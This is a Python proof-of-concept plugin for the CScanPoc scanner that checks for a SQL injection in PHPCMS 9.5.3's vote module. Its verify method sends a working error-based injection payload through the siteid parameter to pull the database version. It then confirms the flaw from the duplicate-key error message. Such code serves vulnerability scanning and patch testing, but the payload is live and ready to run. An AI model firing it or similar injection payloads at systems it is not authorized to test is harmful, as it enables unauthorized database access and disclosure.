# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    poc_id = '8b244b65-7b5f-48ed-b0af-e607a735e269'
    name = 'PHPCMS 9.5.3 /phpcms/modules/vote/classes/vote_tag.class.php SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-05-18'  # 漏洞公布时间
    desc = '''
        vote_tag.class.php 文件siteid变量通过全局来接受，那么在php.ini中的register_globals=On的情况下，
        siteid就变为可控的变量，之后再拼接成$sql变量时也没有进行任何过滤，带入数据库查询就直接导致了SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=051077' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = '9.5.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e0a613c4-7ac1-40cd-b7ac-896589493d57'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/index.php?m=vote&c=index&siteid=1'%20and%20(select%201%20from%20%20(select%20count(*),"
                   "concat(version(),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a);%23")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            reg = re.compile("Duplicate entry '(.*?)' for key 'group_key'")
            res = reg.findall(content)

            if res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()
